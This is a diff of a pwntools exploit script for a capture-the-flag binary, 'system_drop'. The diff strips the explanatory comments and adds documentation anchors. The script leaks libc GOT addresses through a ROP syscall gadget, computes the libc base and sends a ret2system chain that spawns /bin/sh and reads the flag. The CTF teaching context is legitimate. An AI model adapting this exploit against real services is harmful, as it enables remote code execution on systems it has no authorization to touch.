@@ -1,23 +1,11 @@
 from pwn import *
 
-# The name of this challenge gives us a big hint. It's talking about a ROP.
-# Unfortunately for the price of this hint we don't know which libc is being
-# used, so returning on a specific function of the libc is going to be hard.
-
 conn = remote(MACHINE_IP, MACHINE_PORT)
 
 elf = ELF("system_drop")
 elf_rop = ROP(elf)
 
-# By analysing the binary we find a main function which does a buffer overflow
-# And then returns 1.
-# This is really useful because it means when we'll start the rop, 1 will be
-# loaded inside the `rax` register.
-# And this is great because we can find a function named `_syscall` that
-# finishes with a `syscall` instruction then a `ret`.
-# Because the `rax` register will be set to `1`, we can do a write syscall.
-# This will allow us to leak got entries.
-
+# ANCHOR: fn_leak_got
 def leak_got(entry):
     with log.progress("leaking got entry for %s" % entry) as progress:
         progress.status("forging rop")
@@ -46,27 +34,22 @@ def leak_got(entry):
 
         progress.status("computing leak address")
         return u64(conn.recv(0x100)[:0x8])
+# ANCHOR_END: fn_leak_got
 
-# Now that we can leak entries from the got table, we will leak two functions
-# this way we can determine which libc is being used.
-
+# ANCHOR: leak_got
 leak_main = leak_got("__libc_start_main")
 leak_read = leak_got("read")
 
 log.info("Leak __libc_start_main %x" % leak_main)
 log.info("Leak read %x" % leak_read)
+# ANCHOR_END: leak_got
 
-# Once we've the address of `__libc_start_main` and `read` we can use a website
-# like https://libc.blukat.me to find the libc currenly used.
-# This gives us the following libc.
-# All we know need is to set its base address using symbols we leaked.
-
+# ANCHOR: set_base
 libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
 libc.address = leak_read - libc.symbols["read"]
+# ANCHOR_END: set_base
 
-# Finally we'll retrieve a shell, for this a simple rop to load the "/bin/sh"
-# string inside the `rdi` register and then return to the system function.
-
+# ANCHOR: retrieve_shell
 rop = b"A" * 0x28
 rop += p64(elf_rop.find_gadget(['ret']).address)
 rop += p64(elf_rop.find_gadget(["pop rdi", "ret"]).address)
@@ -74,8 +57,9 @@ rop += p64(next(libc.search(b"/bin/sh")))
 rop += p64(libc.sym["system"])
 rop += p64(libc.sym["exit"])
 conn.send(rop)
+# ANCHOR_END: retrieve_shell
 
-# Now we have a shell! All we need is to cat the flag!
-
+# ANCHOR: cat_flag
 conn.sendline("cat flag.txt")
 log.success(conn.recvlineS())
+# ANCHOR_END: cat_flag
